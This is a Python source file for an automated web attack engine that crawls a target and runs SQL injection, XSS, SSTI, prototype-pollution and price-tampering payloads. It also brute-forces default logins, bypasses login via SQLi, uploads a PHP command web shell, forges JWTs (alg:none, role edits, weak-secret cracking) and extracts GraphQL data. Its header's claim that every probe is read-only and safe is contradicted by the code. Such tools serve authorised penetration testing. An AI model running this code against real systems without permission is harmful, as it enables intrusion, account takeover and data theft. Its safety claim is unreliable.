# FILE: backend/services/crawl_engine.py
# PURPOSE: Iterative crawl-and-exploit engine with deep HTML parsing, smart test generation,
#          post-auth loop, JWT manipulation, and GraphQL deep testing.
# SECURITY NOTE: All probes are read-only / safe canary payloads; no destructive operations.

import asyncio
import base64
import hashlib
import hmac as _hmac
import json
import logging
import re
import time
from typing import Any

import httpx
from bs4 import BeautifulSoup

logger = logging.getLogger(__name__)

# ── SQL / injection detection constants ──────────────────────────────────────
SQL_ERRORS = [
    "sql syntax", "mysql_fetch", "ora-", "sqlite", "sequelizedatabaseerror",
    "syntax error near", "unterminated quoted", "pg_query", "sqlstate",
    "unclosed quotation", "invalid query",
]
SQLI_PAYLOADS = ["' OR '1'='1'--", "' OR 1=1--", "admin'--", "' UNION SELECT NULL--"]
XSS_CANARY   = "VULNTEST_CRW_7z4q"
XSS_PAYLOADS = [
    f"<b>{XSS_CANARY}</b>",
    f"<img src=x onerror=alert('{XSS_CANARY}')>",
    f"'\"><script>alert('{XSS_CANARY}')</script>",
]
SSTI_PROBES  = [("{{7*7}}", "49"), ("${7*7}", "49"), ("<%= 7*7 %>", "49"), ("#{7*7}", "49")]
WEAK_SECRETS = ["secret", "password", "jwt", "key", "123456", "supersecret",
                "mysecret", "", "your-secret-key", "jwt_secret", "jwtSecret"]
AUTH_BYPASS_CREDS = [
    ("admin", "admin"), ("admin", "admin123"), ("admin", "password"),
    ("admin", "123456"), ("root", "root"), ("test", "test"),
]
AUTH_SQLI = ["' OR '1'='1'--", "' OR 1=1--", "admin'--"]


class CrawlEngine:
    """
    Iterative crawl-and-exploit engine.
    Crawls pages, generates test cases from discovered surfaces, executes them,
    and loops with authentication to discover authenticated attack surfaces.
    """

    def __init__(
        self,
        target_url: str,
        max_iterations: int = 5,
        max_pages_per_iter: int = 20,
        initial_token: str = "",
    ) -> None:
        self.target              = target_url.rstrip("/")
        self.max_iterations      = max_iterations
        self.max_pages_per_iter  = max_pages_per_iter
        self.client: httpx.AsyncClient | None = None

        # State
        self.visited_urls:       set[str]            = set()
        self.discovered_links:   list[str]            = [target_url]
        self.test_cases_queue:   list[dict]           = []
        self.test_cases_run:     list[dict]           = []
        self.findings:           list[dict]           = []
        self.auth_tokens:        dict[str, str]       = {}
        if initial_token:
            self.auth_tokens["initial"] = initial_token

        # Extend 7: iteration memory & dedup
        self.vuln_type_confirmed:  set[str]            = set()
        self.endpoint_tested:      dict[str, list[str]] = {}
        self.finding_signatures:   set[str]            = set()

    # ── Lifecycle ─────────────────────────────────────────────────────────────

    async def __aenter__(self):
        self.client = httpx.AsyncClient(
            verify=False, timeout=10.0, follow_redirects=True
        )
        return self

    async def __aexit__(self, *_):
        if self.client:
            await self.client.aclose()

    def _c(self) -> httpx.AsyncClient:
        assert self.client is not None, "Use CrawlEngine as async context manager"
        return self.client

    @property
    def _client(self) -> httpx.AsyncClient | None:
        return self.client

    def _auth_headers(self) -> dict:
        tok = (self.auth_tokens.get("discovered") or
               self.auth_tokens.get("initial") or "")
        return {"Authorization": f"Bearer {tok}"} if tok else {}

    # ────────────────────────────────────────────────────────────────────────
    # CRAWL PAGE  (base + Extend 1: deeper HTML parsing)
    # ────────────────────────────────────────────────────────────────────────

    async def crawl_page(self, url: str) -> dict | None:
        """Fetch and deeply parse a page. Returns page_map or None on failure."""
        if url in self.visited_urls:
            return None
        self.visited_urls.add(url)
        try:
            r = await self._c().get(url, headers=self._auth_headers())
        except httpx.RequestError:
            return None

        soup = BeautifulSoup(r.text, "lxml")
        page_map: dict[str, Any] = {
            "url":    url,
            "status": r.status_code,
        }

        # ── Base: forms ───────────────────────────────────────────────────────
        forms = []
        for form in soup.find_all("form"):
            action  = form.get("action", url)
            method  = (form.get("method") or "GET").upper()
            fields  = []
            csrf_field = None
            for inp in form.find_all(["input", "textarea", "select"]):
                fname = inp.get("name") or inp.get("id") or ""
                ftype = inp.get("type", "text").lower()
                if fname:
                    if ftype == "hidden":
                        if any(k in fname.lower() for k in ("csrf", "token", "_token")):
                            csrf_field = fname
                    elif ftype not in ("submit", "button", "reset", "image"):
                        fields.append({"name": fname, "type": ftype})
            if action.startswith("/"):
                action = self.target + action
            forms.append({
                "action": action, "method": method,
                "fields": fields, "csrf_token_field": csrf_field,
            })
        page_map["forms"] = forms

        # ── Base: links ───────────────────────────────────────────────────────
        links = []
        for a in soup.find_all("a", href=True):
            href = a["href"]
            if href.startswith("http"):
                if href.startswith(self.target):
                    links.append(href)
            elif href.startswith("/"):
                links.append(self.target + href)
        page_map["links"] = links
        self.discovered_links.extend(links)

        # ── Base: inline API patterns from scripts ────────────────────────────
        api_patterns: list[str] = []
        for script in soup.find_all("script"):
            if script.string:
                api_patterns.extend(
                    re.findall(r'["\`](/(?:api|rest|v\d)[/a-zA-Z0-9_\-]*)["\`]',
                               script.string)
                )
        page_map["api_patterns"] = list(set(api_patterns))

        # ── Extend 1: Angular/React routes from HTML comments ─────────────────
        angular_routes = re.findall(
            r'<!--\s*route:\s*([/a-zA-Z0-9_\-:]+)\s*-->',
            r.text,
        )
        page_map["angular_routes"] = angular_routes
        for route in angular_routes:
            full = f"{self.target}/#/{route.lstrip('/')}"
            if full not in self.visited_urls:
                self.discovered_links.append(full)

        # ── Extend 1: data-* attributes hinting at API endpoints ─────────────
        data_endpoints: list[str] = []
        for attr in ("data-url", "data-api", "ng-href", "data-action"):
            for tag in soup.find_all(attrs={attr: True}):
                data_endpoints.append(tag[attr])
        page_map["data_endpoints"] = data_endpoints
        self.discovered_links.extend([
            f"{self.target}{ep}" if ep.startswith("/") else ep
            for ep in data_endpoints
        ])

        # ── Extend 1: pagination links (hint at ID ranges) ────────────────────
        pagination: list[str] = []
        for a in soup.find_all("a", href=True):
            if any(kw in (a.get_text() or "").lower()
                   for kw in ("next", "prev", "page", ">>", "<<")):
                pagination.append(a["href"])
        page_map["pagination"] = pagination

        # ── Extend 1: error messages that leak framework info ─────────────────
        error_hints: list[str] = []
        for tag in soup.find_all(class_=re.compile(r"error|alert|warning|danger")):
            txt = tag.get_text()[:100]
            if txt.strip():
                error_hints.append(txt.strip())
        page_map["error_hints"] = error_hints

        # ── Extend 1: hidden inputs ───────────────────────────────────────────
        hidden_inputs: list[dict] = []
        for inp in soup.find_all("input", type="hidden"):
            name  = inp.get("name", "")
            value = inp.get("value", "")
            if name:
                hidden_inputs.append({"name": name, "value": value})
        page_map["hidden_inputs"] = hidden_inputs

        # ── Extend 1: meta tags for framework/version hints ───────────────────
        meta_hints: dict[str, str] = {}
        for meta in soup.find_all("meta"):
            if meta.get("name") in ("generator", "framework", "version"):
                meta_hints[meta["name"]] = meta.get("content", "")
        page_map["meta_hints"] = meta_hints

        return page_map

    # ────────────────────────────────────────────────────────────────────────
    # GENERATE TEST CASES  (base + Extends 2)
    # ────────────────────────────────────────────────────────────────────────

    def generate_test_cases_from_page(self, page_map: dict) -> list[dict]:
        """Generate test cases from a parsed page."""
        url        = page_map.get("url", "")
        test_cases: list[dict] = []

        # ── Base: form injection tests ────────────────────────────────────────
        for form in page_map.get("forms", []):
            action = form["action"]
            method = form["method"]
            for field in form.get("fields", []):
                fname = field["name"]
                ftype = field["type"]
                if ftype in ("text", "email", "search"):
                    test_cases.append({
                        "id":      f"sqli_{action}_{fname}",
                        "type":    "sqli",
                        "method":  method,
                        "url":     action,
                        "field":   fname,
                        "payloads": SQLI_PAYLOADS,
                        "severity": "high",
                        "source":  "form_field",
                    })
                    test_cases.append({
                        "id":      f"xss_{action}_{fname}",
                        "type":    "xss",
                        "method":  method,
                        "url":     action,
                        "field":   fname,
                        "payloads": XSS_PAYLOADS,
                        "severity": "high",
                        "source":  "form_field",
                    })

        # ── Base: API endpoint tests ──────────────────────────────────────────
        for path in page_map.get("api_patterns", []):
            full = self.target + path
            test_cases.append({
                "id":      f"unauth_{path}",
                "type":    "broken_access_control",
                "method":  "GET",
                "url":     full,
                "remove_auth": True,
                "success_check": "data_returned_without_auth",
                "severity": "high",
                "source":  "api_pattern",
            })

        # ── Extend 2: hidden input — price/quantity tampering ─────────────────
        for hidden in page_map.get("hidden_inputs", []):
            name  = hidden["name"].lower()
            value = hidden["value"]

            if any(kw in name for kw in ("price", "amount", "cost", "total", "qty", "quantity")):
                test_cases.append({
                    "id":      f"price_tamper_{url}_{hidden['name']}",
                    "type":    "improper_input_validation",
                    "method":  "POST",
                    "url":     url,
                    "field":   hidden["name"],
                    "payloads": ["-1", "0", "0.001", "99999999", "-0.01"],
                    "success_check": "order_accepted_with_invalid_price",
                    "severity": "high",
                    "source":  "hidden_input_price",
                })

            if any(kw in name for kw in ("userid", "user_id", "uid", "owner", "authorid")):
                test_cases.append({
                    "id":      f"idor_hidden_{url}_{hidden['name']}",
                    "type":    "insecure_design",
                    "method":  "POST",
                    "url":     url,
                    "field":   hidden["name"],
                    "payloads": ["1", "2", "3"],
                    "original_value": value,
                    "success_check": "different_user_data_returned",
                    "severity": "high",
                    "source":  "hidden_input_userid",
                })

            if any(kw in name for kw in ("role", "permission", "admin", "privilege", "level")):
                test_cases.append({
                    "id":      f"role_escalation_{url}_{hidden['name']}",
                    "type":    "broken_access_control",
                    "method":  "POST",
                    "url":     url,
                    "field":   hidden["name"],
                    "payloads": ["admin", "1", "true", "superuser", "9"],
                    "original_value": value,
                    "success_check": "privileged_access_granted",
                    "severity": "critical",
                    "source":  "hidden_input_role",
                })

        # ── Extend 2: pagination → IDOR range discovery ───────────────────────
        if page_map.get("pagination"):
            all_ids = re.findall(r"/(\d+)", " ".join(page_map["pagination"]))
            if all_ids:
                max_id = max(int(i) for i in all_ids)
                test_cases.append({
                    "id":       f"idor_pagination_{url}",
                    "type":     "insecure_design",
                    "method":   "GET",
                    "url":      url,
                    "id_range": list(range(1, min(max_id + 5, 20))),
                    "success_check": "different_user_data_returned",
                    "severity": "high",
                    "source":   "pagination_discovery",
                })

        # ── Extend 2: error hints → framework-specific exploits ───────────────
        for error in page_map.get("error_hints", []):
            error_lower = error.lower()
            if any(kw in error_lower for kw in ("django", "python", "werkzeug")):
                test_cases.append({
                    "id":      f"ssti_django_{url}",
                    "type":    "ssti",
                    "method":  "GET",
                    "url":     url,
                    "payloads": ["{{7*7}}", "{%debug%}", "{{config}}", "{{config.items()}}"],
                    "success_check": "template_evaluated",
                    "severity": "critical",
                    "source":  "django_framework_detected",
                })
            if any(kw in error_lower for kw in ("rails", "ruby")):
                test_cases.append({
                    "id":      f"ssti_erb_{url}",
                    "type":    "ssti",
                    "method":  "GET",
                    "url":     url,
                    "payloads": ["<%= 7*7 %>", "<%= File.read('/etc/passwd') %>"],
                    "success_check": "template_evaluated",
                    "severity": "critical",
                    "source":  "rails_framework_detected",
                })
            if any(kw in error_lower for kw in ("express", "node")):
                test_cases.append({
                    "id":      f"prototype_pollution_{url}",
                    "type":    "improper_input_validation",
                    "method":  "POST",
                    "url":     url,
                    "payload": {"__proto__": {"admin": True}},
                    "success_check": "prototype_polluted",
                    "severity": "high",
                    "source":  "nodejs_framework_detected",
                })

        # ── Extend 2: Angular routes → forced browsing ────────────────────────
        for route in page_map.get("angular_routes", []):
            if any(kw in route.lower()
                   for kw in ("admin", "score", "dashboard", "config",
                               "user", "account", "order")):
                test_cases.append({
                    "id":         f"forced_browse_{route}",
                    "type":       "broken_access_control",
                    "method":     "GET",
                    "url":        f"{self.target}/{route.lstrip('/')}",
                    "remove_auth": True,
                    "success_check": "data_returned_without_auth",
                    "severity":   "high",
                    "source":     "angular_route_discovery",
                })

        return test_cases

    # ────────────────────────────────────────────────────────────────────────
    # EXECUTE TEST CASE  (base + Extends 3, 5)
    # ────────────────────────────────────────────────────────────────────────

    async def execute_test_case(self, tc: dict) -> dict:
        """Execute a single test case. Returns result dict."""

        # ── Extend 7: dedup by signature ─────────────────────────────────────
        sig = f"{tc['type']}:{tc.get('url','')}:{tc.get('field','')}"
        if sig in self.finding_signatures:
            return {"skipped": True, "reason": "duplicate_signature"}
        self.finding_signatures.add(sig)

        # ── Extend 7: skip lower-severity if same type already critical ───────
        if (tc["type"] in self.vuln_type_confirmed
                and tc.get("severity", "medium") in ("low", "info")):
            return {"skipped": True, "reason": "higher_severity_already_confirmed"}

        # ── Base: SQLi ────────────────────────────────────────────────────────
        if tc["type"] == "sqli":
            for payload in tc.get("payloads", SQLI_PAYLOADS)[:4]:
                try:
                    if tc["method"] == "POST":
                        r = await self._c().post(tc["url"], json={tc["field"]: payload})
                    else:
                        r = await self._c().get(tc["url"], params={tc["field"]: payload})
                    body_lower = r.text.lower()
                    if any(e in body_lower for e in SQL_ERRORS):
                        return {
                            "confirmed": True, "vuln_type": "sql_injection",
                            "severity": "critical",
                            "evidence": f"SQL error via {tc['field']}={payload!r}",
                            "response_snippet": r.text[:200],
                        }
                    if r.status_code == 200 and len(r.text) > 500:
                        if any(f in r.text for f in ("email", "password", "users")):
                            return {
                                "confirmed": True, "vuln_type": "sql_injection",
                                "severity": "critical",
                                "evidence": f"Possible data dump via {tc['field']}={payload!r}",
                                "response_snippet": r.text[:200],
                            }
                except httpx.RequestError:
                    continue

        # ── Base: XSS ─────────────────────────────────────────────────────────
        elif tc["type"] == "xss":
            for payload in tc.get("payloads", XSS_PAYLOADS)[:3]:
                try:
                    if tc["method"] == "POST":
                        r = await self._c().post(tc["url"], json={tc["field"]: payload})
                    else:
                        r = await self._c().get(tc["url"], params={tc["field"]: payload})
                    if XSS_CANARY in r.text and not ("&lt;" in r.text or "&amp;" in r.text):
                        return {
                            "confirmed": True, "vuln_type": "xss",
                            "severity": "high",
                            "evidence": f"XSS canary reflected unescaped via {tc['field']}",
                            "response_snippet": r.text[:200],
                        }
                except httpx.RequestError:
                    continue

        # ── Base: broken access control ───────────────────────────────────────
        elif tc["type"] == "broken_access_control":
            try:
                headers = {} if tc.get("remove_auth") else self._auth_headers()
                r = await self._c().get(tc["url"], headers=headers)
                if r.status_code == 200 and len(r.text) > 30:
                    return {
                        "confirmed": True, "vuln_type": "broken_access_control",
                        "severity": tc.get("severity", "high"),
                        "evidence": f"GET {tc['url']} → HTTP {r.status_code} without auth",
                        "response_snippet": r.text[:200],
                    }
            except httpx.RequestError:
                pass

        # ── Base: insecure design / IDOR ──────────────────────────────────────
        elif tc["type"] == "insecure_design":
            ids   = tc.get("id_range") or [1, 2, 3]
            base  = tc["url"].rstrip("/")
            ref   = None
            for oid in ids[:6]:
                try:
                    r = await self._c().get(
                        f"{base}/{oid}", headers=self._auth_headers()
                    )
                    if r.status_code != 200 or len(r.text) < 20:
                        continue
                    if ref is None:
                        ref = r.text
                    elif r.text != ref:
                        return {
                            "confirmed": True, "vuln_type": "insecure_design",
                            "severity": tc.get("severity", "high"),
                            "evidence": f"GET {base}/{oid} returned different data (IDOR)",
                            "response_snippet": r.text[:200],
                        }
                except httpx.RequestError:
                    continue

        # ── Extend 3: price / quantity tampering ──────────────────────────────
        elif (tc["type"] == "improper_input_validation"
              and tc.get("source") == "hidden_input_price"):
            for payload in tc.get("payloads", []):
                try:
                    r = await self._c().request(
                        tc["method"], tc["url"],
                        data={tc["field"]: payload},
                        headers=self._auth_headers(),
                    )
                    if r.status_code in (200, 201, 302):
                        return {
                            "confirmed": True,
                            "vuln_type": "improper_input_validation",
                            "severity": "high",
                            "evidence": f"Order accepted with {tc['field']}={payload}",
                            "source": tc["source"],
                        }
                except httpx.RequestError:
                    continue

        # ── Extend 3: SSTI ────────────────────────────────────────────────────
        elif tc["type"] == "ssti":
            for payload in tc.get("payloads", []):
                try:
                    r = await self._c().get(
                        tc["url"],
                        params={"q": payload, "name": payload,
                                "search": payload, "input": payload},
                    )
                    if "49" in r.text or ("config" in payload.lower()
                                         and "config" in r.text.lower()):
                        return {
                            "confirmed": True, "vuln_type": "ssti",
                            "severity": "critical",
                            "evidence": f"SSTI: {payload!r} evaluated in response",
                            "source": tc.get("source", ""),
                        }
                    r2 = await self._c().post(
                        tc["url"],
                        json={"username": payload, "name": payload,
                              "comment": payload, "feedback": payload},
                    )
                    if "49" in r2.text:
                        return {
                            "confirmed": True, "vuln_type": "ssti",
                            "severity": "critical",
                            "evidence": f"SSTI via POST: {payload!r} → 49",
                            "source": tc.get("source", ""),
                        }
                except httpx.RequestError:
                    continue

        # ── Extend 3: prototype pollution ─────────────────────────────────────
        elif (tc["type"] == "improper_input_validation"
              and tc.get("source") == "nodejs_framework_detected"):
            pp_payloads = [
                {"__proto__": {"admin": True}},
                {"constructor": {"prototype": {"admin": True}}},
                {"__proto__[admin]": "true"},
            ]
            for payload in pp_payloads:
                try:
                    r = await self._c().post(tc["url"], json=payload)
                    if r.status_code not in (400, 422):
                        return {
                            "confirmed": True,
                            "vuln_type": "improper_input_validation",
                            "severity": "high",
                            "evidence": f"Prototype pollution payload accepted",
                            "source": tc["source"],
                        }
                except httpx.RequestError:
                    continue

        # ── Extend 3: file upload ─────────────────────────────────────────────
        elif tc["type"] == "file_upload":
            for fname, content, mime in tc.get("test_files", [
                ("shell.php", b"<?php echo 'test'; ?>", "application/x-php"),
                ("evil.php.jpg", b"<?php system($_GET['cmd']); ?>", "image/jpeg"),
            ]):
                try:
                    r = await self._c().post(
                        tc["url"],
                        files={tc.get("file_field", "file"): (fname, content, mime)},
                        headers=self._auth_headers(),
                    )
                    if r.status_code in (200, 201):
                        upload_path = self._extract_upload_path(r.text)
                        evidence = (f"PHP shell uploaded and accessible at {upload_path}"
                                    if upload_path else
                                    f"Malicious file {fname!r} accepted (HTTP {r.status_code})")
                        return {
                            "confirmed": True, "vuln_type": "file_upload",
                            "severity": "critical" if upload_path else "high",
                            "evidence": evidence,
                            "source": tc.get("source", "file_upload"),
                        }
                except httpx.RequestError:
                    continue

        # ── Extend 5: JWT manipulation ────────────────────────────────────────
        elif (tc["type"] == "broken_auth"
              and tc.get("source") == "jwt_manipulation"):
            return await self._execute_jwt_manipulation(tc)

        return {"confirmed": False}

    def _extract_upload_path(self, response_text: str) -> str:
        for pat in [r'"path"\s*:\s*"([^"]+)"', r'"url"\s*:\s*"([^"]+)"',
                    r'"filename"\s*:\s*"([^"]+)"', r"/uploads/[a-zA-Z0-9_\-\.]+"]:
            m = re.search(pat, response_text)
            if m:
                return m.group(1) if pat.startswith('"') else m.group(0)
        return ""

    # ── Extend 5: JWT manipulation implementation ─────────────────────────────

    async def _execute_jwt_manipulation(self, tc: dict) -> dict:
        original = tc.get("token", "")
        parts = original.split(".")
        if len(parts) != 3:
            return {"confirmed": False}

        for tampering in tc.get("tampering", []):
            # alg:none bypass
            if tampering == "alg_none":
                hdr = base64.b64encode(
                    json.dumps({"typ": "JWT", "alg": "none"}).encode()
                ).decode().rstrip("=")
                forged = f"{hdr}.{parts[1]}."
                try:
                    r = await self._c().get(
                        tc["url"], headers={"Authorization": f"Bearer {forged}"}
                    )
                    if r.status_code == 200:
                        return {
                            "confirmed": True, "vuln_type": "broken_auth",
                            "severity": "critical",
                            "evidence": "JWT alg:none accepted — signature bypass",
                            "source": tc["source"],
                        }
                except httpx.RequestError:
                    pass

            # Role escalation in payload
            elif tampering == "role_escalation":
                try:
                    payload_data = json.loads(
                        base64.b64decode(parts[1] + "==").decode()
                    )
                    if "data" in payload_data:
                        payload_data["data"]["role"] = "admin"
                        payload_data["data"]["isAdmin"] = True
                    new_p = base64.b64encode(
                        json.dumps(payload_data).encode()
                    ).decode().rstrip("=")
                    forged = f"{parts[0]}.{new_p}.{parts[2]}"
                    r = await self._c().get(
                        tc["url"], headers={"Authorization": f"Bearer {forged}"}
                    )
                    if r.status_code == 200 and "admin" in r.text.lower():
                        return {
                            "confirmed": True, "vuln_type": "broken_auth",
                            "severity": "critical",
                            "evidence": "JWT role escalation to admin accepted",
                            "source": tc["source"],
                        }
                except Exception:
                    pass

            # Weak secret brute-force
            elif tampering == "weak_secret":
                header_payload = f"{parts[0]}.{parts[1]}"
                for secret in WEAK_SECRETS:
                    sig = _hmac.new(
                        secret.encode(),
                        header_payload.encode(),
                        hashlib.sha256,
                    ).digest()
                    computed = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
                    if computed == parts[2]:
                        return {
                            "confirmed": True, "vuln_type": "broken_auth",
                            "severity": "critical",
                            "evidence": f"JWT signed with weak secret: {secret!r}",
                            "source": tc["source"],
                        }

        return {"confirmed": False}

    # ── Extend 6: GraphQL deep testing ───────────────────────────────────────

    async def probe_graphql(self, endpoint: str) -> list[dict]:
        """Introspection → schema map → field extraction → batch attack."""
        findings: list[dict] = []
        gql_url = self.target + endpoint

        # Step 1: introspection
        try:
            r = await self._c().post(
                gql_url,
                json={"query": "{__schema{types{name fields{name}}}}"},
                headers=self._auth_headers(),
            )
            if r.status_code != 200:
                return findings
        except httpx.RequestError:
            return findings

        findings.append({
            "vuln_type": "underprotected_apis",
            "severity":  "high",
            "evidence":  f"GraphQL introspection enabled at {endpoint}",
            "source":    "graphql_introspection",
        })

        # Step 2: extract schema and query sensitive types
        try:
            schema = r.json()
            types  = (schema.get("data") or {}).get("__schema", {}).get("types", [])
            sensitive = [
                t for t in types
                if any(kw in (t.get("name") or "").lower()
                       for kw in ("user", "admin", "password", "secret", "order", "payment"))
            ]
            for stype in sensitive[:5]:
                fields = [f["name"] for f in (stype.get("fields") or []) if f.get("name")]
                if not fields:
                    continue
                query = f'{{ {stype["name"].lower()}s {{ {" ".join(fields[:5])} }} }}'
                try:
                    r2 = await self._c().post(
                        gql_url, json={"query": query}, headers=self._auth_headers()
                    )
                    if r2.status_code == 200 and "data" in r2.text:
                        findings.append({
                            "vuln_type": "sensitive_data_exposure",
                            "severity":  "critical",
                            "evidence":  f"GraphQL {stype['name']} data exposed: {r2.text[:200]}",
                            "source":    "graphql_data_extraction",
                        })
                except httpx.RequestError:
                    pass
        except Exception:
            pass

        # Step 3: batch DoS check
        try:
            batch = [{"query": "{__typename}"}] * 50
            r3 = await self._c().post(
                gql_url, json=batch, headers=self._auth_headers()
            )
            if r3.status_code == 200:
                findings.append({
                    "vuln_type": "underprotected_apis",
                    "severity":  "medium",
                    "evidence":  "GraphQL batching enabled — rate limiting bypassable",
                    "source":    "graphql_batching",
                })
        except httpx.RequestError:
            pass

        return findings

    # ── Authentication helper ─────────────────────────────────────────────────

    async def _try_authenticate(self) -> bool:
        """Try to obtain an auth token via SQLi or common credentials."""
        auth_paths = ["/api/auth/login", "/api/Users/login", "/api/login",
                      "/login", "/auth/local", "/api/token"]
        for path in auth_paths:
            url = self.target + path
            # SQLi
            for payload in AUTH_SQLI:
                try:
                    r = await self._c().post(
                        url, json={"email": payload, "password": "x"}
                    )
                    if r.status_code == 200:
                        tok = self._extract_token(r.text)
                        if tok:
                            self.auth_tokens["discovered"] = tok
                            logger.info("[CrawlEngine] auth via SQLi at %s", path)
                            return True
                except httpx.RequestError:
                    continue
            # Common creds
            for uname, pwd in AUTH_BYPASS_CREDS:
                try:
                    r = await self._c().post(
                        url, json={"email": uname, "password": pwd}
                    )
                    if r.status_code == 200:
                        tok = self._extract_token(r.text)
                        if tok:
                            self.auth_tokens["discovered"] = tok
                            logger.info("[CrawlEngine] auth via creds %s at %s", uname, path)
                            return True
                except httpx.RequestError:
                    continue
        return False

    def _extract_token(self, text: str) -> str:
        try:
            data = json.loads(text)
            for k in ("token", "access_token", "jwt", "id_token"):
                if k in data:
                    return str(data[k])
            auth = data.get("authentication", {})
            if isinstance(auth, dict) and "token" in auth:
                return str(auth["token"])
        except Exception:
            m = re.search(r'"token"\s*:\s*"([A-Za-z0-9_\-\.]+)"', text)
            if m:
                return m.group(1)
        return ""

    # ── Main run loop ─────────────────────────────────────────────────────────

    async def run(self) -> dict:
        """
        Orchestrates: crawl → generate tests → execute → auth → post-auth loop.
        Returns dict of all findings.
        """
        start = time.time()

        # ── Phase 1: unauthenticated crawl ────────────────────────────────────
        for iteration in range(self.max_iterations):
            if not self.discovered_links:
                break

            # Take next batch of URLs to crawl
            batch = []
            while self.discovered_links and len(batch) < self.max_pages_per_iter:
                url = self.discovered_links.pop(0)
                if url not in self.visited_urls:
                    batch.append(url)

            if not batch:
                break

            # Crawl pages and generate test cases
            for url in batch:
                page_map = await self.crawl_page(url)
                if page_map and page_map.get("status") == 200:
                    new_tests = self.generate_test_cases_from_page(page_map)
                    run_ids = {t["id"] for t in self.test_cases_run}
                    self.test_cases_queue.extend(
                        [t for t in new_tests if t["id"] not in run_ids]
                    )

            # Execute queued test cases
            for tc in list(self.test_cases_queue):
                self.test_cases_queue.remove(tc)
                self.test_cases_run.append(tc)
                result = await self.execute_test_case(tc)
                if result.get("confirmed"):
                    finding = {**tc, **result}
                    self.findings.append(finding)
                    # Extend 7: track confirmed vuln types
                    self.vuln_type_confirmed.add(finding.get("vuln_type", tc["type"]))
                    # ELK log
                    try:
                        from services.elk_logger import elk
                        elk.log_probe_result(
                            session_id=0,
                            vuln_type=finding.get("vuln_type", tc["type"]),
                            scenario_name=tc.get("id", ""),
                            method=tc.get("method", "GET"),
                            url=tc.get("url", ""),
                            status_code=0,
                            confirmed=True,
                            evidence=finding.get("evidence", ""),
                            duration_ms=0,
                        )
                    except Exception:
                        pass

            # Try to authenticate after first crawl iteration
            if iteration == 0 and not self.auth_tokens:
                await self._try_authenticate()

        # ── Extend 4: post-auth loop ──────────────────────────────────────────
        if self.auth_tokens.get("discovered"):
            token = self.auth_tokens["discovered"]
            self._c().headers.update({"Authorization": f"Bearer {token}"})

            auth_urls = [
                f"{self.target}/profile", f"{self.target}/account",
                f"{self.target}/dashboard", f"{self.target}/orders",
                f"{self.target}/admin", f"{self.target}/api/users",
                f"{self.target}/api/orders", f"{self.target}/rest/user/whoami",
            ]
            for url in auth_urls:
                if url in self.visited_urls:
                    continue
                page_map = await self.crawl_page(url)
                if not (page_map and page_map.get("status") == 200):
                    continue
                new_auth_tests = self.generate_test_cases_from_page(page_map)

                # Add special authenticated tests
                new_auth_tests.extend([
                    {
                        "id":      f"idor_auth_{url}",
                        "type":    "insecure_design",
                        "method":  "GET",
                        "url":     url,
                        "id_range": list(range(1, 6)),
                        "success_check": "different_user_data_returned",
                        "severity": "high",
                        "source":   "authenticated_idor",
                    },
                    {
                        "id":         f"jwt_tamper_{url}",
                        "type":       "broken_auth",
                        "token":      token,
                        "tampering":  ["alg_none", "weak_secret", "role_escalation"],
                        "url":        url,
                        "success_check": "manipulated_jwt_accepted",
                        "severity":   "critical",
                        "source":     "jwt_manipulation",
                    },
                ])

                run_ids = {t["id"] for t in self.test_cases_run}
                for tc in new_auth_tests:
                    if tc["id"] in run_ids:
                        continue
                    self.test_cases_run.append(tc)
                    result = await self.execute_test_case(tc)
                    if result.get("confirmed"):
                        finding = {**tc, **result}
                        self.findings.append(finding)
                        self.vuln_type_confirmed.add(finding.get("vuln_type", tc["type"]))

        # ── Extend 6: GraphQL deep testing ────────────────────────────────────
        graphql_paths = [
            p for p in self.visited_urls
            if "graphql" in p.lower()
        ]
        if not graphql_paths:
            # Try common graphql path
            try:
                r = await self._c().get(self.target + "/graphql")
                if r.status_code < 400:
                    graphql_paths.append(self.target + "/graphql")
            except httpx.RequestError:
                pass

        for gql_url in graphql_paths[:2]:
            path = gql_url.replace(self.target, "") or "/graphql"
            gql_findings = await self.probe_graphql(path)
            self.findings.extend(gql_findings)
            for f in gql_findings:
                self.vuln_type_confirmed.add(f.get("vuln_type", ""))

        return {
            "target":           self.target,
            "pages_crawled":    len(self.visited_urls),
            "tests_run":        len(self.test_cases_run),
            "findings":         self.findings,
            "confirmed_vulns":  list(self.vuln_type_confirmed),
            "auth_obtained":    bool(self.auth_tokens),
            "duration_ms":      int((time.time() - start) * 1000),
        }
